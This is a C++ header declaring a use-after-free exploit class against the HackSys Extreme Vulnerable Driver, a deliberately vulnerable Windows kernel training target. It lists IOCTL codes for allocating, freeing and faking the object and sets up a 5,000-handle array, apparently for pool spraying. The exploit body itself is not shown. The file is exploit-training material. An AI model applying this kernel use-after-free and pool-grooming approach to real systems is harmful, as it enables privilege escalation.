#pragma once

#include "common.h"
#include "IExploit.h"
#include "HevdConstants.h"

class ExploitUseAfterFree : public IExploit {
	
	static constexpr wchar_t *Exploit_Name 				= L"Use After Free";
	
	static constexpr DWORD Ioctl_Code_Allocate			= HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT;
	static constexpr DWORD Ioctl_Code_Use 				= HACKSYS_EVD_IOCTL_USE_UAF_OBJECT;
	static constexpr DWORD Ioctl_Code_Free 				= HACKSYS_EVD_IOCTL_FREE_UAF_OBJECT;
	static constexpr DWORD Ioctl_Code_Alloc_Fake_Object	= HACKSYS_EVD_IOCTL_ALLOCATE_FAKE_OBJECT;
	
	static constexpr size_t Max_Number_Of_Objects 		= 5000;

	shared_ptr<HANDLE> m_handles;
	bool m_afterCleanup;	
	
public:
	ExploitUseAfterFree(Driver& driver) : IExploit(driver) {
		m_afterCleanup = false;
		m_handles.reset(new HANDLE[Max_Number_Of_Objects]);
		if(!m_handles) {
			throw bad_alloc();
		}
		
		memset(m_handles.get(), 0xFF, sizeof(HANDLE) * Max_Number_Of_Objects);
	}
	
	virtual ~ExploitUseAfterFree() {
		handlesCleanup();
	}
	
	virtual const wchar_t* getName() const { 
		return ExploitUseAfterFree::Exploit_Name;
	};
	
	virtual DWORD getIoctlCode() const {
		return ExploitUseAfterFree::Ioctl_Code_Allocate;
	}
	
	virtual bool exploit();
	
private:
	
	bool derandomizePool();
	
	void handlesCleanup() {
		if(!m_afterCleanup) {
			wcout << L"[.] Performing unusued handles cleanup..." << endl;
			
			for(size_t i = 0; i < Max_Number_Of_Objects; i++) {
				if(m_handles.get()[i] != INVALID_HANDLE_VALUE) {
					CloseHandle(m_handles.get()[i]);
				}
			}
			
			m_afterCleanup = true;
		}
	}
};
